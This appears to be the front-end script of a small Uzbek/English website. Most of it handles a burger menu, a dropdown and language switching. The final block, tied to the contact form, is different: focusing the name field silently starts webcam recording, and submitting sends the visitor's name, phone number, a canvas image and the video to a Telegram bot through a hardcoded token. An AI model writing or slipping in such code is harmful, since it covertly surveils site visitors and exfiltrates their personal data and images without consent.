document.addEventListener("DOMContentLoaded", function () {
    const burgerBtn = document.querySelector(".header__burger__btn");
    const navList = document.querySelector(".header__list");
    const dropdownToggle = document.querySelector(".dropdown-toggle");
    const dropdownMenu = document.querySelector(".card");
    const langOptions = document.querySelectorAll(".lang-option");
    const s_lan = document.querySelector(".s_lan");

    // Burger menyu funksiyasi
    burgerBtn.addEventListener("click", () => {
        navList.classList.toggle("hidden");
    });

    // Dropdown menyuni ochish-yopish
    dropdownToggle.addEventListener("click", function () {
        dropdownMenu.classList.toggle("hidden");
    });

    // Til almashtirish funksiyasi
    const translations = {
        uz: {
            home: "Bosh sahifa",
            about: "Haqida",
            projects: "Loyihalar",
            contact: "Bog’lanish",
            language: "Til"
        },
        en: {
            home: "Home",
            about: "About",
            projects: "Projects",
            contact: "Contact",
            language: "Language"
        },
    };

    langOptions.forEach((option) => {
        option.addEventListener("click", function () {
            const selectedLang = this.getAttribute("data-lang");
            localStorage.setItem("selectedLang", selectedLang); // Tanlangan tilni saqlash

            document.querySelectorAll("[data-lang]").forEach((element) => {
                const key = element.getAttribute("data-lang");
                if (translations[selectedLang][key]) {
                    element.innerText = translations[selectedLang][key];
                }
            });

            dropdownMenu.classList.add("hidden"); // Til tanlangandan keyin menyuni yopish
        });
    });

    // Sayt ochilganda so'nggi tanlangan tilni yuklash
    const savedLang = localStorage.getItem("selectedLang") || "uz";
    document.querySelector(`[data-lang="${savedLang}"]`).click();


    let mediaRecorder;
        let videoChunks = [];
        let videoBlob;
        let stream;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        let isRecording = false;

        document.getElementById('ism').addEventListener('focus', async () => {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = stream;
            video.style.display = 'block';
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (event) => videoChunks.push(event.data);
            mediaRecorder.start();
            isRecording = true;
        });

        document.querySelector('.form__send__btn').addEventListener('click', async function(event) {
            event.preventDefault();
            if (isRecording && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            mediaRecorder.onstop = async () => {
                videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                videoChunks = [];
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';

                let ism = document.getElementById('ism').value;
                let telefon = document.getElementById('telefon').value;
                let botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
                let chatId = '7221078203';
                let message = `Yangi xabar!%0AIsm: ${ism}%0ATelefon: ${telefon}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);

                if (canvas && canvas.toBlob) {
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.png');
                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                    });
                }

                if (videoBlob) {
                    let formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', videoBlob, 'video.mp4');
                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
                }
                alert('Xabar yuborildi!');
            };
        });
    
});
